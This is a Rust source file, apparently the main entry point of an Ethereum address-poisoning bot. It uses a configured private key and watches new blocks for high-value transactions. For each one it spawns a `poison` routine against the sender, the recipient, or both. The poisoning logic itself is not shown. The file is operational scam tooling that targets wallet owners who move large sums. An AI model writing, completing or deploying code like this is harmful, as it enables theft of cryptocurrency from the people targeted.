use crate::config::get_config;
use crate::poison::poison;
use crate::providers::{get_http_provider, get_ws_provider};
use crate::utils::setup_logger;
use alloy::consensus::Transaction;
use alloy::network::{EthereumWallet, TransactionResponse};
use alloy::primitives::U256;
use alloy::providers::Provider;
use alloy::signers::local::PrivateKeySigner;
use futures_util::StreamExt;
use log::debug;
use rocksdb::DB;
use std::ops::Mul;
use std::str::FromStr;
use std::sync::Arc;

mod config;
mod poison;
mod providers;
mod utils;

#[tokio::main]
async fn main() {
    setup_logger();

    let config = Arc::new(get_config());
    let target_value = U256::from(config.target.value);
    let target_value = target_value.mul(U256::from(10).pow(U256::from(18)));

    let db = Arc::new(DB::open_default("db").unwrap());
    let ws_provider = get_ws_provider(&config.ws_url).await;

    let private_key_signer = PrivateKeySigner::from_str(&config.private_key).unwrap();
    let ethereum_wallet = EthereumWallet::from(private_key_signer);
    let http_provider = Arc::new(get_http_provider(ethereum_wallet, &config.http_url));

    let mut stream = ws_provider
        .subscribe_full_blocks()
        .full()
        .into_stream()
        .await
        .unwrap();

    while let Some(block) = stream.next().await {
        let block = block.unwrap();
        debug!("new block received | number {}", block.number());

        for transaction in block.into_transactions_iter() {
            if transaction.value() > target_value {
                debug!("matching transaction found | hash {}", transaction.tx_hash());

                if config.target.from {
                    tokio::spawn(poison(
                        Arc::clone(&config),
                        Arc::clone(&db),
                        Arc::clone(&http_provider),
                        transaction.to().unwrap(),
                        transaction.from(),
                    ));
                }

                if config.target.to && transaction.to().is_some() {
                    tokio::spawn(poison(
                        Arc::clone(&config),
                        Arc::clone(&db),
                        Arc::clone(&http_provider),
                        transaction.from(),
                        transaction.to().unwrap(),
                    ));
                }
            }
        }
    }
}
